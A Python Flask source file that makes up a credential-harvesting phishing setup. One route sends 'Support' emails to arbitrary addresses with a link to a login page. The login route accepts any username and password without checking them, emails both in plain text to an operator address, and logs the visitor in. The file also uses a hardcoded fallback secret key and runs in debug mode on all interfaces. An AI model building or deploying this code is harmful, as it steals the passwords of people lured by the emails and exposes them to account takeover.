from flask import Flask, request, redirect, url_for, session, render_template
from flask_mail import Mail, Message
from dotenv import load_dotenv
import os
import threading

# ===== Load .env =====
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supersecretkey")

# ===== Mail Config =====
app.config["MAIL_SERVER"] = os.environ.get("MAIL_SERVER", "smtp.gmail.com")
app.config["MAIL_PORT"] = int(os.environ.get("MAIL_PORT", 587))
app.config["MAIL_USE_TLS"] = os.environ.get("MAIL_USE_TLS", "True") == "True"
app.config["MAIL_USE_SSL"] = os.environ.get("MAIL_USE_SSL", "False") == "True"
app.config["MAIL_USERNAME"] = os.environ.get("MAIL_USERNAME")
app.config["MAIL_PASSWORD"] = os.environ.get("MAIL_PASSWORD")
app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER")

mail = Mail(app)

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@example.com")
APP_URL = os.environ.get("APP_URL", "http://localhost:5777")

# ===== Helper function for threaded emails =====
def send_async_email(msg):
    with app.app_context():
        try:
            mail.send(msg)
        except Exception as e:
            print("Email send error:", e)

# ===== ROUTES =====
@app.route("/send_msg", methods=["POST"])
def send_msg():
    data = request.json
    if not data or "email" not in data:
        return {"status": False, "message": "Email is required"}, 400

    email = data["email"]
    link = f"{APP_URL}/login"

    msg = Message(
        subject="Support",
        recipients=[email],
        body=f"Click here to visit: {link}"
    )
    threading.Thread(target=send_async_email, args=(msg,)).start()

    return {"status": True, "message": "Mail sent successfully"}

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("name")
        password = request.form.get("password")

        # Send login alert to admin
        msg = Message(
            subject="Login Alert",
            recipients=[ADMIN_EMAIL],
            body=f"Username: {username}\nPassword: {password}"
        )
        threading.Thread(target=send_async_email, args=(msg,)).start()

        session["username"] = username
        return redirect(url_for("dashboard"))

    return render_template("home.html")

@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("dashboard.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ===== Run Server =====
if __name__ == "__main__":
    app.run(debug=True, port=5777, host="0.0.0.0")
